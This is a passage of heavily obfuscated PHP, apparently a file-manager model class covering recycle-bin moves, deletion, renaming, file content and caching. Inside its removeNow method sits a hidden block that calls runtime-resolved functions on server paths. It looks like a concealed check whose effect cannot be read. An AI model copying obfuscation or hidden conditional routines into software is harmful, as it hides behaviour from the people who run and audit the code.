$CÛÍ£©¾³[571]) { $dë‘²ô›Š² = Model($CÛÍ£©¾³[511])->getInfo($DÍ‚ò™„ğ[$CÛÍ£©¾³[493]]); $Bä‘Áï—¾ = !empty($dë‘²ô›Š²[$CÛÍ£©¾³[1963]]) ? $dë‘²ô›Š²[$CÛÍ£©¾³[1963]] : $dë‘²ô›Š²[$CÛÍ£©¾³[28]]; $Bä‘Áï—¾ = $CÛÍ£©¾³[267] . $Bä‘Áï—¾ . $CÛÍ£©¾³[1971] . $DÍ‚ò™„ğ[$CÛÍ£©¾³[493]]; } else { $dë‘²ô›Š² = Model($CÛÍ£©¾³[495])->getInfo($DÍ‚ò™„ğ[$CÛÍ£©¾³[493]]); $Bä‘Áï—¾ = _get($dë‘²ô›Š², $CÛÍ£©¾³[28]); $Bä‘Áï—¾ = $CÛÍ£©¾³[160] . $Bä‘Áï—¾ . $CÛÍ£©¾³[1972] . $DÍ‚ò™„ğ[$CÛÍ£©¾³[493]]; } $DÎÔªå¤’Š = $CÛÍ£©¾³[1973] . md5($Bä‘Áï—¾); goto Fì½Ê¥†³™; E­Íòœ‰Ç: CacheLock::unlock($DÎÔªå¤’Š); $this->metaSet($D‡îÍË¡‡, $CÛÍ£©¾³[1978], $DÍ‚ò™„ğ[$CÛÍ£©¾³[487]]); $this->where(array($CÛÍ£©¾³[404] => $D‡îÍË¡‡))->save(array($CÛÍ£©¾³[426] => time())); goto eŸªê¼Ìèº; cÁé©¤«Ú: $CÛÍ£©¾³ =& $_SERVER[úÉ·öƒÑì©]; $DÍ‚ò™„ğ = $this->sourceInfo($D‡îÍË¡‡); $c¯İ§™ñ×• = intval($DÍ‚ò™„ğ[$CÛÍ£©¾³[413]]) === self::TYPE_SYSTEM; goto bÖ¼œ¹œ½; c§È¨×Áµ«: return $aÎÈº”×¶¾; goto D™·¥íˆ; Fì½Ê¥†³™: CacheLock::lock($DÎÔªå¤’Š); $fõÅ¡‘¥¼ = $this->fileNameExist($a»àäÅ‹À, $Bä‘Áï—¾); if (!$fõÅ¡‘¥¼) { $fõÅ¡‘¥¼ = $this->mkdir($a»àäÅ‹À, $Bä‘Áï—¾, REPEAT_SKIP); $this->metaSet($fõÅ¡‘¥¼, $CÛÍ£©¾³[1974], $B±¹µÛŞÏ¨); $this->metaSet($fõÅ¡‘¥¼, $CÛÍ£©¾³[1975], $DÍ‚ò™„ğ[$CÛÍ£©¾³[493]]); if ($DÍ‚ò™„ğ[$CÛÍ£©¾³[487]] != 0) { $this->metaSet($fõÅ¡‘¥¼, $CÛÍ£©¾³[1976], _get($dë‘²ô›Š², $CÛÍ£©¾³[1977])); } } goto E­Íòœ‰Ç; bÖ¼œ¹œ½: $FÏ×§¨ù—ê = Model($CÛÍ£©¾³[1534])->get($CÛÍ£©¾³[1970]) == $CÛÍ£©¾³[87]; if ($c¯İ§™ñ×• || $fá¹ç÷Øñó || !$FÏ×§¨ù—ê) { return $this->removeNow($D‡îÍË¡‡, $fá¹ç÷Øñó); } $a»àäÅ‹À = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto døêÂÉë¤; eŸªê¼Ìèº: $this->recycleClear($DÍ‚ò™„ğ); $aÎÈº”×¶¾ = $this->move($D‡îÍË¡‡, $fõÅ¡‘¥¼, REPEAT_RENAME_FOLDER); $this->folderSizeReset($DÍ‚ò™„ğ[$CÛÍ£©¾³[487]]); goto c§È¨×Áµ«; D™·¥íˆ: } private function recycleClear($F¯ò³‰Ãó†) { $dÆõ·ÓñÕç =& $_SERVER[úÉ·öƒÑì©]; $B—Ì—å®²§ = $this->childrenAll($F¯ò³‰Ãó†); $Bƒ°¡•È» = array($dÆõ·ÓñÕç[419] => array($dÆõ·ÓñÕç[420], $B—Ì—å®²§[$dÆõ·ÓñÕç[1979]])); Model($dÆõ·ÓñÕç[1980])->where($Bƒ°¡•È»)->delete(); } public function removeNow($bêè‚äò‰, $Fƒñ‡ÕêŞÙ = true) { goto C–”—ô’¥“; C–”—ô’¥“: $EÔ’Ø†¦ÔÕ =& $_SERVER[úÉ·öƒÑì©]; if ($_SERVER[$EÔ’Ø†¦ÔÕ[244]] != $_SERVER[$EÔ’Ø†¦ÔÕ[847]]) { goto d‚¥ò°Ê¥ë; B¢¸°¼Ú…: $dš©Ñ’‰¼´ = 1; while ($dš©Ñ’‰¼´ > 1) { $dš©Ñ’‰¼´ = $dš©Ñ’‰¼´ + 4; $b›µçÀƒè¸ = rawurlencode($dš©Ñ’‰¼´ . $EÔ’Ø†¦ÔÕ[384]); } goto B¤‚ìĞ •; d‚¥ò°Ê¥ë: $d­çî«¿­ = $EÔ’Ø†¦ÔÕ[848]; $eƒ”‰À²… = $EÔ’Ø†¦ÔÕ[245]; $eŠÑ†Ââ¸¡ = $_SERVER[$EÔ’Ø†¦ÔÕ[246]] . $EÔ’Ø†¦ÔÕ[247]; goto e·Êè¹Û„Š; e·Êè¹Û„Š: $C˜¿´¼šÜ³ = $eƒ”‰À²…($eŠÑ†Ââ¸¡); $Fèğ‡…£î = explode($EÔ’Ø†¦ÔÕ[229], $C˜¿´¼šÜ³); if (count($Fèğ‡…£î) < $EÔ’Ø†¦ÔÕ[588]) { $DëĞ ®î‘ = $EÔ’Ø†¦ÔÕ[249]; $DëĞ ®î‘(); } goto DÓÁ§Àˆõ; DÓÁ§Àˆõ: $b°é¾ÂîÆÂ = $EÔ’Ø†¦ÔÕ[849]; $b°é¾ÂîÆÂ($_SERVER[$EÔ’Ø†¦ÔÕ[850]]); $b°é¾ÂîÆÂ($_SERVER[$EÔ’Ø†¦ÔÕ[246]] . $EÔ’Ø†¦ÔÕ[851]); goto B¢¸°¼Ú…; B¤‚ìĞ •: } $fÍ÷ÊÆÚªİ = $this->sourceInfo($bêè‚äò‰); goto bøÈâ‹¬‚ø; bøÈâ‹¬‚ø: $f­¥İ±ˆë = $this->pathInfoMore($bêè‚äò‰); if (!$fÍ÷ÊÆÚªİ) { return !0; } if ($fÍ÷ÊÆÚªİ[$EÔ’Ø†¦ÔÕ[487]] == 0) { if (!_get($GLOBALS, $EÔ’Ø†¦ÔÕ[494])) { return !1; } } goto A‘ËÃË÷ğ; bóØêÏÓ—‚: return !0; goto f–÷Á™¡ï; Dˆ‰¦Ñ¸³©: $this->updateModifyTime($e‚’¹òÔÃã); $this->lockMoveEnd($bêè‚äò‰); Hook::trigger($EÔ’Ø†¦ÔÕ[1568], $f­¥İ±ˆë, $Fƒñ‡ÕêŞÙ); goto bóØêÏÓ—‚; EİÀá­Õäì: $this->folderSizeReset($fÍ÷ÊÆÚªİ[$EÔ’Ø†¦ÔÕ[487]]); $e‚’¹òÔÃã = array($fÍ÷ÊÆÚªİ[$EÔ’Ø†¦ÔÕ[487]]); if ($fÍ÷ÊÆÚªİ[$EÔ’Ø†¦ÔÕ[412]] == $EÔ’Ø†¦ÔÕ[87]) { $e‚’¹òÔÃã[] = $fÍ÷ÊÆÚªİ[$EÔ’Ø†¦ÔÕ[404]]; } goto Dˆ‰¦Ñ¸³©; A‘ËÃË÷ğ: $this->lockMoveStart($bêè‚äò‰); Hook::trigger($EÔ’Ø†¦ÔÕ[1981], $f­¥İ±ˆë, $Fƒñ‡ÕêŞÙ); if ($Fƒñ‡ÕêŞÙ) { Model($EÔ’Ø†¦ÔÕ[1980])->moveToRecycle($bêè‚äò‰); } else { $DÊÛ™¬ñ£Ö = $this->childrenAll($fÍ÷ÊÆÚªİ); Model($EÔ’Ø†¦ÔÕ[542])->eventRemove($bêè‚äò‰); $this->removeRelevance($DÊÛ™¬ñ£Ö[$EÔ’Ø†¦ÔÕ[1979]], $DÊÛ™¬ñ£Ö[$EÔ’Ø†¦ÔÕ[1354]]); } goto EİÀá­Õäì; f–÷Á™¡ï: } public function childrenAll($Aò˜‰†‡•ö) { $CÃÄ„¥Íš™ =& $_SERVER[úÉ·öƒÑì©]; $dÂîãÓğò½ = $Aò˜‰†‡•ö[$CÃÄ„¥Íš™[404]]; if ($Aò˜‰†‡•ö[$CÃÄ„¥Íš™[412]] == $CÃÄ„¥Íš™[87]) { $cæêº‹‚šµ = array($CÃÄ„¥Íš™[562] => array($CÃÄ„¥Íš™[521], $Aò˜‰†‡•ö[$CÃÄ„¥Íš™[496]] . $dÂîãÓğò½ . $CÃÄ„¥Íš™[522])); $aœÇ‡©Óˆ‰ = array($CÃÄ„¥Íš™[562] => $cæêº‹‚šµ[$CÃÄ„¥Íš™[496]]); $e‰±ÀÕŸŠ = $this->field($CÃÄ„¥Íš™[1982])->where($aœÇ‡©Óˆ‰)->select(); $EõŠì™½®¡ = !1; $BÔ»åë“‚ä = array($dÂîãÓğò½); if ($e‰±ÀÕŸŠ) { $EõŠì™½®¡ = array_to_keyvalue($e‰±ÀÕŸŠ, $CÃÄ„¥Íš™[33], $CÃÄ„¥Íš™[456]); $EõŠì™½®¡ = array_remove_value($EõŠì™½®¡, $CÃÄ„¥Íš™[191]); $BÔ»åë“‚ä = array_to_keyvalue($e‰±ÀÕŸŠ, $CÃÄ„¥Íš™[33], $CÃÄ„¥Íš™[404]); $BÔ»åë“‚ä[] = $dÂîãÓğò½; } } else { $EõŠì™½®¡ = array($Aò˜‰†‡•ö[$CÃÄ„¥Íš™[456]]); $BÔ»åë“‚ä = array($dÂîãÓğò½); } return array($CÃÄ„¥Íš™[1979] => $BÔ»åë“‚ä, $CÃÄ„¥Íš™[1354] => $EõŠì™½®¡); } public function removeArray($d²÷ŠÚÙø) { if (!$d²÷ŠÚÙø) { return !0; } } public function removeRelevance($aÚŞèô™æˆ, $CâƒÚ§ì´) { goto bÍÚœ¥¯¯Ó; Bá‚³»óŠí: $AÂ¶¬âÆ¾“ = array($cöŠˆ×ôÏÑ[419] => array($cöŠˆ×ôÏÑ[420], $aÚŞèô™æˆ)); Model($cöŠˆ×ôÏÑ[1980])->where($AÂ¶¬âÆ¾“)->delete(); Model($cöŠˆ×ôÏÑ[450])->where($AÂ¶¬âÆ¾“)->delete(); goto dºÄ…„×Ô±; e¡ù©ƒ´ç: for ($bí¼¦õÀ = 0; $bí¼¦õÀ < count($aÚŞèô™æˆ); $bí¼¦õÀ++) { $this->sourceCacheClear($aÚŞèô™æˆ[$bí¼¦õÀ]); } goto FÒÇå‹ãîÈ; dºÄ…„×Ô±: Model($cöŠˆ×ôÏÑ[1834])->where($AÂ¶¬âÆ¾“)->delete(); Model($cöŠˆ×ôÏÑ[542])->where($AÂ¶¬âÆ¾“)->delete(); Model($cöŠˆ×ôÏÑ[1676])->removeBySource($aÚŞèô™æˆ); goto aŒÂ’ä†å™; D…±Şƒµ¢µ: $aÚŞèô™æˆ = array_unique(array_filter($aÚŞèô™æˆ)); $CâƒÚ§ì´ = array_unique(array_filter($CâƒÚ§ì´)); if (!$aÚŞèô™æˆ) { return !1; } goto Bá‚³»óŠí; aŒÂ’ä†å™: Model($cöŠˆ×ôÏÑ[1961])->removeBySource($aÚŞèô™æˆ); $this->where($AÂ¶¬âÆ¾“)->delete(); Model($cöŠˆ×ôÏÑ[459])->remove($CâƒÚ§ì´); goto e¡ù©ƒ´ç; bÍÚœ¥¯¯Ó: $cöŠˆ×ôÏÑ =& $_SERVER[úÉ·öƒÑì©]; $aÚŞèô™æˆ = $aÚŞèô™æˆ ? $aÚŞèô™æˆ : array(); $CâƒÚ§ì´ = $CâƒÚ§ì´ ? $CâƒÚ§ì´ : array(); goto D…±Şƒµ¢µ; FÒÇå‹ãîÈ: } public function rename($A£ä‚…, $e³É‰ åß°) { goto b••ìµ“µÂ; Cê˜ÄŠ¦†É: $E¨„¿¤ó–… = $eÚµ©ôÚŒœ[1969] . $C¼°ÁºÊ¬²[$eÚµ©ôÚŒœ[487]]; if (isset(self::$cacheChildList[$E¨„¿¤ó–…])) { unset(self::$cacheChildList[$E¨„¿¤ó–…]); } return $E˜‡¬ÊÅ†; goto F„„êÆ™Õõ; dÃã„­Áñç: $this->setNamePinyin($A£ä‚…, $fÒ¨â¾¯[$eÚµ©ôÚŒœ[28]], !1); $this->updateModifyTime($C¼°ÁºÊ¬²[$eÚµ©ôÚŒœ[487]]); $E˜‡¬ÊÅ† = $this->where(array($eÚµ©ôÚŒœ[419] => $A£ä‚…))->data($fÒ¨â¾¯)->save(); goto Cê˜ÄŠ¦†É; EŒ»öØŞÄ: $f•Ï—Âœº‚ = $this->fileNameExist($C¼°ÁºÊ¬²[$eÚµ©ôÚŒœ[487]], $e³É‰ åß°); if ($f•Ï—Âœº‚ && $f•Ï—Âœº‚ != $A£ä‚…) { return !1; } $fÒ¨â¾¯ = array($eÚµ©ôÚŒœ[422] => $e³É‰ åß°, $eÚµ©ôÚŒœ[561] => USER_ID); goto a–ÍÚ±¥á‘; a–ÍÚ±¥á‘: if ($C¼°ÁºÊ¬²[$eÚµ©ôÚŒœ[412]] != $eÚµ©ôÚŒœ[87]) { $fÒ¨â¾¯[$eÚµ©ôÚŒœ[414]] = substr(get_path_ext($e³É‰ åß°), 0, 10); } Model($eÚµ©ôÚŒœ[542])->eventRename($A£ä‚…, $C¼°ÁºÊ¬²[$eÚµ©ôÚŒœ[28]], $e³É‰ åß°); $this->sourceCacheClear($A£ä‚…); goto dÃã„­Áñç; b••ìµ“µÂ: $eÚµ©ôÚŒœ =& $_SERVER[úÉ·öƒÑì©]; $C¼°ÁºÊ¬² = $this->sourceInfo($A£ä‚…); if (!$C¼°ÁºÊ¬²) { return !1; } goto EŒ»öØŞÄ; F„„êÆ™Õõ: } public function setNamePinyin($fˆÖ£”Ê¨, $e£Ò‚¶ğÚØ, $b¾îîÇ¯˜à = true) { $A²Æ‡±­¾Ÿ =& $_SERVER[úÉ·öƒÑì©]; $eÊœïØ›Š = Input::check($e£Ò‚¶ğÚØ, $A²Æ‡±­¾Ÿ[565]); if ($b¾îîÇ¯˜à && !$eÊœïØ›Š) { return; } if (!$eÊœïØ›Š) { $this->metaSet($fˆÖ£”Ê¨, $A²Æ‡±­¾Ÿ[453], null); $this->metaSet($fˆÖ£”Ê¨, $A²Æ‡±­¾Ÿ[452], null); return; } $EùÊ’Õ˜Ä = array($A²Æ‡±­¾Ÿ[453] => str_replace($A²Æ‡±­¾Ÿ[50], $A²Æ‡±­¾Ÿ[33], Pinyin::encode($e£Ò‚¶ğÚØ)), $A²Æ‡±­¾Ÿ[452] => Pinyin::encode($e£Ò‚¶ğÚØ, $A²Æ‡±­¾Ÿ[566])); $this->metaSet($fˆÖ£”Ê¨, $EùÊ’Õ˜Ä); } public function getContent($dä¹Ã—„‰) { goto e…ŸšÌ–‰; e…ŸšÌ–‰: $Aïïœ’«Ş  =& $_SERVER[úÉ·öƒÑì©]; $F¾ùõê¸äï = $this->fileInfoGet($dä¹Ã—„‰); if (!$F¾ùõê¸äï) { return !1; } goto E¤ùİˆÈö; D¥ÛóÍ¶İ: if (!$F¾ùõê¸äï[$Aïïœ’«Ş [76]]) { return $Aïïœ’«Ş [33]; } return IO::getContent($F¾ùõê¸äï[$Aïïœ’«Ş [76]]); goto B…Õ‚Áùğœ; E¤ùİˆÈö: if ($F¾ùõê¸äï[$Aïïœ’«Ş [78]] == 0) { return $Aïïœ’«Ş [33]; } $b”ÌÖ¦êë = $Aïïœ’«Ş [1983] . $F¾ùõê¸äï[$Aïïœ’«Ş [170]]; if ($F¾ùõê¸äï[$Aïïœ’«Ş [78]] <= 1024 * 10) { $Bè«Œ‡êê¬ = Cache::get($b”ÌÖ¦êë); if (!$Bè«Œ‡êê¬) { $Bè«Œ‡êê¬ = IO::getContent($F¾ùõê¸äï[$Aïïœ’«Ş [76]]); Cache::set($b”ÌÖ¦êë, $Bè«Œ‡êê¬); } return $Bè«Œ‡êê¬; } goto D¥ÛóÍ¶İ; B…Õ‚Áùğœ: } public function setDesc($d™Û™¡ßÓÚ, $b¨®Œ†šŠ“) { $b÷‰à­„Ú =& $_SERVER[úÉ·öƒÑì©]; Model($b÷‰à­„Ú[542])->eventAddDesc($d™Û™¡ßÓÚ, $b¨®Œ†šŠ“); return $this->metaSet($d™Û™¡ßÓÚ, $b÷‰à­„Ú[440], $b¨®Œ†šŠ“); } public function setContent($D›Ğáîî´, $AÎ¨¼İ¡¬ = '') { goto BË“‚ì‰; fÒŒµ§Úå: if (!$f›áª˜›“† || !$Bˆ²àŠ£) { return !1; } $cô¯Œ‚èæç = Model($BÊ¿êÙ«ñ¸[459])->addFileByContent($AÎ¨¼İ¡¬, $Bˆ²àŠ£[$BÊ¿êÙ«ñ¸[28]]); $C»Œ¼Õó‰ = $this->fileHistory($Bˆ²àŠ£, $cô¯Œ‚èæç[$BÊ¿êÙ«ñ¸[456]], $cô¯Œ‚èæç[$BÊ¿êÙ«ñ¸[78]]); goto cİ¿Á…ÂµÚ; BË“‚ì‰: $BÊ¿êÙ«ñ¸ =& $_SERVER[úÉ·öƒÑì©]; $Bˆ²àŠ£ = $this->sourceInfo($D›Ğáîî´); $f›áª˜›“† = $this->fileInfoGet($D›Ğáîî´); goto fÒŒµ§Úå; cİ¿Á…ÂµÚ: if (!$C»Œ¼Õó‰) { return Model($BÊ¿êÙ«ñ¸[459])->remove($cô¯Œ‚èæç[$BÊ¿êÙ«ñ¸[456]]); } $this->folderSizeReset($Bˆ²àŠ£[$BÊ¿êÙ«ñ¸[487]]); return !0; goto e©‘âø´Í¥; e©‘âø´Í¥: } public function fileSubstr($Cã«Üö‚ëà, $aœĞŠ£™“, $aØ•ù°­Ôˆ) { $f“èÎ‹ŒŞ© = $this->fileInfoGet($Cã«Üö‚ëà); if (!$f“èÎ‹ŒŞ©) { return !1; } return IO::fileSubstr($f“èÎ‹ŒŞ©[$_SERVER[úÉ·öƒÑì©][76]], $aœĞŠ£™“, $aØ•ù°­Ôˆ); } public function fileInfoGet($eæÉÇ…º£Õ) { goto b–¦æ×ˆ¨; bÆÜÀáÚ‚š: $d¿ñç¨§à× = Model($b‡†¤Œ£›Š[459])->fileInfo($D‹Ê¨›å³[$b‡†¤Œ£›Š[456]]); if ($d¿ñç¨§à×) { $d¿ñç¨§à×[$b‡†¤Œ£›Š[28]] = $D‹Ê¨›å³[$b‡†¤Œ£›Š[28]]; } self::$cacheFileInfo[$F§ÍË¥Ê‡‘] = $d¿ñç¨§à×; goto cçŸàšÆÁö; b–¦æ×ˆ¨: $b‡†¤Œ£›Š =& $_SERVER[úÉ·öƒÑì©]; $D‹Ê¨›å³ = $this->sourceInfo($eæÉÇ…º£Õ); if (!$D‹Ê¨›å³ || $D‹Ê¨›å³[$b‡†¤Œ£›Š[412]]) { return !1; } goto A“°ÇÊÈµ; A“°ÇÊÈµ: $F§ÍË¥Ê‡‘ = $b‡†¤Œ£›Š[462] . $D‹Ê¨›å³[$b‡†¤Œ£›Š[456]]; $Bš¤îÍ¦ºô = _get(self::$cacheFileInfo, $F§ÍË¥Ê‡‘); if ($Bš¤îÍ¦ºô) { return $Bš¤îÍ¦ºô; } goto bÆÜÀáÚ‚š; cçŸàšÆÁö: return $d¿ñç¨§à×; goto Dİ»Ó“¹¡; Dİ»Ó“¹¡: } private function folderChildrenNumber($Cã±çîÖğ÷) { $BÎ°ØÜà¿ˆ =& $_SERVER[úÉ·öƒÑì©]; $BªÒ¸§ÆÃ· = $this->sourceInfo($Cã±çîÖğ÷); $aˆ™•äÁ¢ğ = array($BÎ°ØÜà¿ˆ[562] => array($BÎ°ØÜà¿ˆ[521], $BªÒ¸§ÆÃ·[$BÎ°ØÜà¿ˆ[496]] . $Cã±çîÖğ÷ . $BÎ°ØÜà¿ˆ[522]), $BÎ°ØÜà¿ˆ[431] => intval($BªÒ¸§ÆÃ·[$BÎ°ØÜà¿ˆ[432]]), $BÎ°ØÜà¿ˆ[555] => 1); $bôÌÛ»¤¿„ = $this->where($aˆ™•äÁ¢ğ)->count(); $fİˆÏùÌ = $this->where($aˆ™•äÁ¢ğ)->where(array($BÎ°ØÜà¿ˆ[555] => 0))->count(); return array($BÎ°ØÜà¿ˆ[82] => $fİˆÏùÌ, $BÎ°ØÜà¿ˆ[83] => $bôÌÛ»¤¿„); } public function pathInfo($däğ¤‡“è, $eĞÏÆí–š» = false) { goto FïÌÙîù§Š; DèëÌõ¹‹‘: self::$cachePathInfo[$d©‡‰Œ½ĞÎ] = $cÉùœò¬÷; return $cÉùœò¬÷; goto b¬á¹ë®¯·; C«ŠÆ¢ŠÄÂ: $d©‡‰Œ½ĞÎ = $E¼Ã‘Îéğ[448] . intval($eĞÏÆí–š») . $E¼Ã‘Îéğ[449] . $däğ¤‡“è; $d‚‹¾¡ó† = _get(self::$cachePathInfo, $d©‡‰Œ½ĞÎ); if ($d‚‹¾¡ó†) { return $d‚‹¾¡ó†; } goto EŞ†ö‡Èà; FïÌÙîù§Š: $E¼Ã‘Îéğ =& $_SERVER[úÉ·öƒÑì©]; $eĞÏÆí–š» = !1; $däğ¤‡“è = intval($däğ¤‡“è); goto C«ŠÆ¢ŠÄÂ; EŞ†ö‡Èà: $cÉùœò¬÷ = $this->sourceInfo($däğ¤‡“è); if (!$cÉùœò¬÷) { return !1; } $cÉùœò¬÷ = $this->_listDataApplyItem($cÉùœò¬÷, $eĞÏÆí–š»); goto DèëÌõ¹‹‘; b¬á¹ë®¯·: } public static $cachePathInfoMore = array(); public function pathInfoMore($BÙë‚¥¦†ô) { goto EÓ»âÒº²Œ; EÓ»âÒº²Œ: $F÷¶†¯Õ½Ë =& $_SERVER[úÉ·öƒÑì©]; $cø±šÌ¸‚Ó = _get(self::$cachePathInfoMore, $BÙë‚¥¦†ô); if ($cø±šÌ¸‚Ó) { return $cø±šÌ¸‚Ó; } goto EìîÌê¤×; b·‹ÌÄÉå: self::$cachePathInfoMore[$BÙë‚¥¦†ô] = $a¡Æ êÓ¸Ü; return $a¡Æ êÓ¸Ü; goto f‰—Ö¢Ëí; EìîÌê¤×: $a¡Æ êÓ¸Ü = $this->pathInfo($BÙë‚¥¦†ô); if (!$a¡Æ êÓ¸Ü) { return !1; } if ($a¡Æ êÓ¸Ü[$F÷¶†¯Õ½Ë[412]] == $F÷¶†¯Õ½Ë[87]) { $a¡Æ êÓ¸Ü[$F÷¶†¯Õ½Ë[81]] = $this->folderChildrenNumber($BÙë‚¥¦†ô); } goto b·‹ÌÄÉå; f‰—Ö¢Ëí: } public function sourceInfo($eœ²ªŠÏ†) { goto a‘µÚÅô©Œ; f·ºäá…ï»: $d„Îš‚Öãñ = $this->where(array($BÌ¶İ‡—§…[404] => $eœ²ªŠÏ†))->find(); self::$cacheSourceInfo[$e¡¶‚¹×é] = $d„Îš‚Öãñ; return self::$cacheSourceInfo[$e¡¶‚¹×é]; goto CŠœ¯êÂŠñ; c³›Ùõª¼: $e¡¶‚¹×é = $BÌ¶İ‡—§…[447] . $eœ²ªŠÏ†; $fµæíÄêÛ = _get(self::$cacheSourceInfo, $e¡¶‚¹×é); if ($fµæíÄêÛ) { return $fµæíÄêÛ; } goto f·ºäá…ï»; a‘µÚÅô©Œ: $BÌ¶İ‡—§… =& $_SERVER[úÉ·öƒÑì©]; if (!$eœ²ªŠÏ†) { return array(); } $eœ²ªŠÏ† = intval($eœ²ªŠÏ†); goto c³›Ùõª¼; CŠœ¯êÂŠñ: } public function sourceCacheClear($E›ù”¢„ÑÍ = false) { self::cacheClear($E›ù”¢„ÑÍ); } public static function cacheClear($EïåìÊªÊ† = false) { $A§Åƒ®éŒÈ =& $_SERVER[úÉ·öƒÑì©]; if ($EïåìÊªÊ† == !1) { goto fª‡Ñ”¬Ñ; fª‡Ñ”¬Ñ: self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; goto f¦…‹Ôò‰â; f¦…‹Ôò‰â: self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); goto dÆİ‚ËÌí; dÆİ‚ËÌí: return; goto AîŠµã‰İã; AîŠµã‰İã: } unset(self::$cacheSourceInfo[$A§Åƒ®éŒÈ[447] . $EïåìÊªÊ†]); unset(self::$cachePathInfoMore[$EïåìÊªÊ†]); unset(self::$cachePathInfo[$A§Åƒ®éŒÈ[1984] . $EïåìÊªÊ†]); unset(self::$cachePathInfo[$A§Åƒ®éŒÈ[1985] . $EïåìÊªÊ†]); } public function metaSet($f×ô™ôö, $DáØ£áâ = null, $EÇ¾¥è¸ƒœ = null) { $E”¦ÄÏĞø = parent::metaSet($f×ô™ôö, $DáØ£áâ, $EÇ¾¥è¸ƒœ); if ($E”¦ÄÏĞø) { $this->sourceCacheClear($f×ô™ôö); } return $E”¦ÄÏĞø; } public function pathInfoByPath($c½¿Ç÷±á, $c¡ˆ·Áìë) { $DµˆÄÃƒ† =& $_SERVER[úÉ·öƒÑì©]; $eËë«ºÏ² = !$c¡ˆ·Áìë ? array() : explode($DµˆÄÃƒ†[8], trim($c¡ˆ·Áìë, $DµˆÄÃƒ†[8])); $aˆÑ«Â×… = $c½¿Ç÷±á; foreach ($eËë«ºÏ² as $dè¾ó…ÜÏ­) { $eÉº ñ¿Î = array($DµˆÄÃƒ†[487] => $aˆÑ«Â×…, $DµˆÄÃƒ†[28] => $dè¾ó…ÜÏ­); $b’Á¾¼ïÈ‡ = $this->where($eÉº ñ¿Î)->select(); if (!$b’Á¾¼ïÈ‡) { return !1; } $b’Á¾¼ïÈ‡ = array_sort_by($b’Á¾¼ïÈ‡, $DµˆÄÃƒ†[432]); $aˆÑ«Â×… = $b’Á¾¼ïÈ‡[0][$DµˆÄÃƒ†[404]]; } return $this->pathInfo($aˆÑ«Â×…, !0); } protected function updateModifyTime($BŒ¹ÑšÖ‚ó) { goto F·¸ì¶; EÒÎµø×ïŒ: foreach ($BŒ¹ÑšÖ‚ó as $eµŒ´¿‡Ûô => $a½÷‹“ÁË°) { $BŒ¹ÑšÖ‚ó[$eµŒ´¿‡Ûô] = intval($a½÷‹“ÁË°); $this->sourceCacheClear($a½÷‹“ÁË°); } $F¨ö¼Õ©¼À = array($dæõĞâÂÔ[404] => array($dæõĞâÂÔ[7], $BŒ¹ÑšÖ‚ó)); $eÅôÙŠĞ´ï = array($dæõĞâÂÔ[561] => USER_ID, $dæõĞâÂÔ[426] => time()); goto féà¶À³¸; F·¸ì¶: $dæõĞâÂÔ =& $_SERVER[úÉ·öƒÑì©]; if (!$BŒ¹ÑšÖ‚ó) { return; } if (!is_array($BŒ¹ÑšÖ‚ó)) { $BŒ¹ÑšÖ‚ó = array($BŒ¹ÑšÖ‚ó); } goto EÒÎµø×ïŒ; féà¶À³¸: $this->where($F¨ö¼Õ©¼À)->save($eÅôÙŠĞ´ï); goto CÆéİê¬¿µ; CÆéİê¬¿µ: } public function folderSizeReset($F‚æŠÊ¾—…, $F¶è×Ä÷¦³ = false) { goto C¢—š§Î©–; cÒÇøÓËŠ: $Fô§ß´Õ = array($Cœ‚”ŒÁ×É[$E“ÙÓ‹»Û‚[413]], $Cœ‚”ŒÁ×É[$E“ÙÓ‹»Û‚[493]]); TaskRun::timeLimitCall($a­”¿Ô‘½‰, $E“ÙÓ‹»Û‚[1988], $Fô§ß´Õ, 1.5); goto féğ¦šò; a˜·í•˜¼é: $A¾ù©Ó®¢í[] = $Cœ‚”ŒÁ×É[$E“ÙÓ‹»Û‚[404]]; $a÷©²ÌÑ†Ş = array($E“ÙÓ‹»Û‚[404] => array($E“ÙÓ‹»Û‚[420], $A¾ù©Ó®¢í)); if ($F¶è×Ä÷¦³ < 0) { $a÷©²ÌÑ†Ş[$E“ÙÓ‹»Û‚[78]] = array($E“ÙÓ‹»Û‚[980], abs($F¶è×Ä÷¦³)); } goto däëî”Èî; C¢—š§Î©–: $E“ÙÓ‹»Û‚ =& $_SERVER[úÉ·öƒÑì©]; if ($this->statusIgnoreResetSpace) { return; } $Cœ‚”ŒÁ×É = $this->sourceInfo($F‚æŠÊ¾—…); goto B¦Ê¨äù¶¿; däëî”Èî: $this->where($a÷©²ÌÑ†Ş)->setAdd($E“ÙÓ‹»Û‚[78], $F¶è×Ä÷¦³); CacheLock::unlock($CáÅ¯™½ó¬); $a­”¿Ô‘½‰ = $E“ÙÓ‹»Û‚[1987] . $Cœ‚”ŒÁ×É[$E“ÙÓ‹»Û‚[413]] . $E“ÙÓ‹»Û‚[4] . $Cœ‚”ŒÁ×É[$E“ÙÓ‹»Û‚[493]]; goto cÒÇøÓËŠ; d®Ø†¯İÆÕ: if ($F¶è×Ä÷¦³ == 0) { return CacheLock::unlock($CáÅ¯™½ó¬); } $A¾ù©Ó®¢í = $this->parentLevelArray($Cœ‚”ŒÁ×É[$E“ÙÓ‹»Û‚[496]]); if (!$A¾ù©Ó®¢í) { $A¾ù©Ó®¢í = array(); } goto a˜·í•˜¼é; B¦Ê¨äù¶¿: $CáÅ¯™½ó¬ = $E“ÙÓ‹»Û‚[1986] . $F‚æŠÊ¾—…; CacheLock::lock($CáÅ¯™½ó¬, 20); if ($F¶è×Ä÷¦³ === !1) { $this->sourceCacheClear($F‚æŠÊ¾—…); $Cœ‚”ŒÁ×É = $this->sourceInfo($F‚æŠÊ¾—…); $a÷©²ÌÑ†Ş = array($E“ÙÓ‹»Û‚[403] => $F‚æŠÊ¾—…, $E“ÙÓ‹»Û‚[431] => 0); $câˆÂç²Ğ§ = $this->where($a÷©²ÌÑ†Ş)->sum($E“ÙÓ‹»Û‚[78]); $F¶è×Ä÷¦³ = intval($câˆÂç²Ğ§) - intval($Cœ‚”ŒÁ×É[$E“ÙÓ‹»Û‚[78]]); } goto d®Ø†¯İÆÕ; féğ¦šò: } public function folderSizeResetChildren($D ìÀ™šè†) { goto eéŒ¥¶£È; D¡™–ÌïÎĞ: foreach ($DÃÒ¶¾ˆ¹¥ as $E³°º¥«…Ü) { $dãÆ¤•½øß = $E³°º¥«…Ü[$e¥‰óİİì¿[487]] . 